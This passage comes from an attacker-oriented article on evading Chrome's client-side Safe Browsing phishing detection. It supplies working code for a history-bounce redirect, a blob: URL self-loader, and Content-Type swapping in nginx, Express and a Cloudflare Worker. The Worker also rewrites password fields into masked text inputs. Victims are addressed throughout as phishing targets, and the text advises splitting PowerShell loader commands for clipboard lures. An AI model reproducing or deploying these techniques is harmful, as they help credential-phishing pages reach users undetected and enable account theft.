We need an intermediate site that accepts HTML in a URL parameter and executes JS. Any site with reflected HTML injection or open redirect will do, or simply a second controlled domain.

Page 1 - our phishing:

```html
<script>
(function() {
  // Check navigation type via Performance API
  var entries = performance.getEntriesByType('navigation');
  if (entries.length && entries[0].type != 'back_forward') {
    // First visit - redirect to bounce page
    location.href = 'https://back.aels-martin.workers.dev';
  }
})();
</script>
```

Note: `performance.getEntriesByType('navigation')[0].type` returns `'back_forward'` specifically for history navigation. This is the same transition type that CSD checks via `PAGE_TRANSITION_FORWARD_BACK`. We use it to reliably distinguish a "return" from a first visit without relying solely on sessionStorage.

The bounce page is any URL that serves `<script>history.back()</script>`. Easiest approach is a Cloudflare Worker on a separate subdomain. In the example above that's `back.aels-martin.workers.dev`.

Great.

---

### Trick #3: blob: URL - a page outside CSD's jurisdiction

This is arguably the most interesting trick. Chromium has a `BlockedSchemeNavigationThrottle` that blocks renderer-initiated top-frame navigation to `data:` and `filesystem:` schemes. Notice - only those two.

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/content/browser/renderer_host/blocked_scheme_navigation_throttle.cc, lines 103-108
if (handle.IsInMainFrame() && handle.IsRendererInitiated() &&
    !handle.IsSameDocument() && !handle.IsHistory() &&
    (handle.GetURL().SchemeIs(url::kDataScheme) ||
     handle.GetURL().SchemeIs(url::kFileSystemScheme)) &&
    !base::FeatureList::IsEnabled(
        features::kAllowContentInitiatedDataUrlNavigations)) {
  // block
}
```

`blob:` URL is **absent** from this list. Top-frame navigation to a `blob:` URL is **allowed**, even without a user click, even without user gesture.

Meanwhile `blob:` is not HTTP or HTTPS. CSD checks:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc
if (!url_.SchemeIsHTTPOrHTTPS()) {
  DontClassifyForPhishing(NO_CLASSIFY_SCHEME_NOT_SUPPORTED);
}
```

`blob:https://evil.com/uuid` - the scheme is `blob`, not `https`. CSD **won't start**.

We insert a script into any page that creates a `blob:` URL with a minimal JS loader inside. The loader fetches the same page via `location.href` from the original document and renders it via `document.write()`. The blob inherits origin from its creator, therefore `fetch()` to the same domain works without CORS issues. No separate files, no payloads - the page loads itself.

Just insert this block into the `<head>` of any page:

```html
<script>
if (location.protocol !== 'blob:') {
  // We're on a regular https:// page - redirect to blob.
  // The JS loader inside the blob fetches this same page and writes it to document.
  var src = location.href;
  var code = '<!DOCTYPE html>'
    + '<html><head><meta charset="utf-8"></head><body>'
    + '<script>'
    + 'fetch("' + src + '")'
    + '.then(function(r){return r.text()})'
    + '.then(function(h){document.open();document.write(h);document.close()})'
    + '<\/script></body></html>';
  var b = new Blob([code], {type: 'text/html'});
  location.href = URL.createObjectURL(b);
}
</script>
```

Inside the blob, `location.protocol` will be `'blob:'`, therefore when loaded via `document.write()` the script won't fire again - no loop.

What happens:

```
1. Victim opens https://evil.com/login
   CSD: starts preclassification
   But the page navigates to blob: instantly - visual capture doesn't get a chance

2. location.href = blob:...
   BlockedSchemeNavigationThrottle: blob: not in the list -> allowed

3. blob: page loads
   CSD: SchemeIsHTTPOrHTTPS() == false -> classifier doesn't start

4. fetch('https://evil.com/login') from inside the blob
   Works - blob: inherits origin from its creator

5. document.write() renders the full HTML of the page
   Script doesn't fire again (location.protocol === 'blob:')
   URL in address bar: blob:https://evil.com/uuid
   CSD: doesn't re-trigger (same-document operation)
```

An absolute banger. The user sees a fully functional phishing page, CSD isn't running, all JS APIs are available. The page is self-contained - no separate files.

Limitations:
- The address bar shows `blob:https://evil.com/uuid` - an observant user might notice
- The `blob:` URL lives as long as the creating page is alive. After navigation the creator is destroyed, but the blob is already loaded into the document - that's fine
- Safe Browsing URL blacklist checks the origin. If the domain is already blacklisted - the red screen may appear on the first step. But for a fresh domain that's not an issue
- `document.write()` doesn't re-trigger CSD since it's a same-document operation. The URL remains `blob:` - the scheme doesn't change

Excellent.

---

### Trick #4: Content-Type - the best and most convenient method

CSD takes the MIME type from the **raw HTTP header** `Content-Type`, not from the result of content-type sniffing. This is the key point.

In the code, when `ShouldClassifyUrlRequest` is created, MIME is extracted like this:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc, ShouldClassifyUrlRequest constructor
if (response_head->headers) {
  response_head->headers->GetMimeType(&mime_type_);
}
```

`HttpResponseHeaders::GetMimeType()` parses the `Content-Type` header directly:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/net/http/http_response_headers.cc
std::optional<std::string> combined_value =
    GetNormalizedHeader("content-type");
```

Meanwhile content-type sniffing (`net::SniffMimeType()`) updates a different field - `response->mime_type` in `URLResponseHead.mojom`. CSD does not read that field.

Then the comparison:

```cpp
// https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc
bool is_mime_type_unsupported =
    mime_type_ != "text/html" && mime_type_ != "application/xhtml+xml";
```

Only two values. Everything else is `NO_CLASSIFY_UNSUPPORTED_MIME_TYPE`.

What this means: if our server serves a full HTML page but with the header `Content-Type: image/svg+xml` - Chrome will render it as HTML (thanks to sniffing), but CSD won't start.

nginx example:

```nginx
location /landing {
  default_type image/svg+xml;
  alias /var/www/phishing/index.html;
}
```

Or in Express:

```javascript
app.get('/landing', (req, res) => {
  res.setHeader('Content-Type', 'image/svg+xml');
  res.sendFile(__dirname + '/phishing.html');
});
```

Chrome will render HTML correctly (content sniffing will identify HTML), but CSD will see `image/svg+xml` from the raw header and skip classification.

Here's a table of Content-Type values that bypass CSD while Chrome still renders the HTML page:

```
Content-Type                    CSD       Chrome rendering     Suitable?
------------------------------  --------  -------------------  ----------
text/html                       CLASSIFY  HTML                 No
image/svg+xml                   SKIP      HTML (sniffing)      Yes
text/xml                        SKIP      HTML (sniffing)      Yes
(empty / no header)             SKIP      HTML (sniffing)      Yes
application/xhtml+xml           CLASSIFY  HTML                 No
```

If we're using Cloudflare - this can be done with a Worker, without touching the server. The Worker intercepts the response and does everything at once - swaps the `Content-Type` and replaces password inputs:

```javascript
// Cloudflare Worker: Content-Type swap + password input replacement
export default {
  async fetch(request) {
    const response = await fetch(request);
    const contentType = response.headers.get('content-type') || '';

    // Only process text/html and xhtml -
    // these are the only two MIMEs CSD considers classifiable.
    if (!/text\/html|application\/xhtml\+xml/i.test(contentType)) {
      return response;
    }

    // 1. Swap Content-Type to image/svg+xml
    const headers = new Headers(response.headers);
    const charset = contentType.match(/charset=([^;\s]+)/i);
    headers.set(
      'content-type',
      'image/svg+xml' + (charset ? '; charset=' + charset[1] : '')
    );

    // 2. Replace type="password" with type="text" using masking font
    let html = await response.text();

    // Inject dot-font and style before </head>
    const patchCSS = `
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Dotted+Songti+Square&display=swap">
<style>
  .pwd-mask { font-family: 'Dotted Songti Square', serif; -webkit-text-security: disc; letter-spacing: 2px; }
</style>`;
    html = html.replace(/(<\/head>)/i, patchCSS + '$1');

    // Replace all input type="password" with type="text" class="pwd-mask"
    html = html.replace(
      /(<input\b[^>]*?)\btype\s*=\s*["']password["']([^>]*?>)/gi,
      '$1type="text" class="pwd-mask" autocomplete="off" spellcheck="false"$2'
    );

    return new Response(html, {
      status: response.status,
      statusText: response.statusText,
      headers
    });
  }
};
```

We bind the Worker to a route in the Cloudflare dashboard - and all HTML responses on that route get two changes:
- `Content-Type: image/svg+xml` - CSD skips classification
- all `<input type="password">` replaced with `<input type="text" class="pwd-mask">` with dot-font attached

Chrome will render HTML via sniffing, the user will see dots when typing a password, but for Chrome it's just a regular text field on a page with a non-HTML MIME type. No triggers.

This is the simplest method - one Worker solves two problems at once (CSD bypass + password input replacement), requires no JS on the page, and doesn't change the URL in the address bar.

Vio-la ¯\_(ツ)_/¯.

Important: this doesn't bypass the Safe Browsing URL blacklist. If our URL is already blacklisted - the red screen will appear regardless of Content-Type. This only bypasses on-device CSD preclassification.

---

### Remaining thoughts out loud

**1. Enhanced Protection = more triggers.**

Keyboard lock, vibration, pointer lock, fullscreen, notification permission, clipboard copy - all of these re-trigger classification only for ESB users. If our page doesn't use these APIs - for an ESB user only the standard page-load trigger remains.

**2. Clipboard: break up the commands.**

If our phishing requires the victim to copy a command (PowerShell loader, etc.), keep in mind the incomplete (relative to Windows bash) token normalization.

**4. Experimental browser-side path.**

There's `kClientSideDetectionCopyFromSurface` - an alternative path that takes a screenshot via browser `CopyFromSurface()` instead of renderer-side paint preview. In this case:
- capture waits for `window.load`
- capture waits for visibility == VISIBLE (tab not hidden)
- max size: 4096x2160

It's currently disabled by default. When Chrome enables it in a future release, renderer-side bypasses will stop working.

---

### Recommended reading

- A good overview of Safe Browsing architecture (albeit outdated): chromium.org/developers/design-documents/safebrowsing
- https://telegra.ph/Getting-rid-of-Google-Safebrowsing-red-screen-once-and-forever-Step-by-step-02-18 - my previous and now outdated article.
- CSD host sources: https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/browser/client_side_detection_host.cc
- Visual extractor sources: https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/content/renderer/phishing_classifier/phishing_visual_feature_extractor.cc
- CSD feature flags: https://chromium.googlesource.com/chromium/src/+/HEAD/components/safe_browsing/core/common/features.cc
- Chromium Code Search: source.chromium.org - search for `ClientSideDetectionHost`, `PhishingVisualFeatureExtractor`, `ShouldClassifyUrlRequest`

From these files, you can find the current thresholds, timeouts, and feature flags - handy stuff.

---

### Finale

And may Cthulhu save us and our users from red screens.

Profit to us all. Until next time.
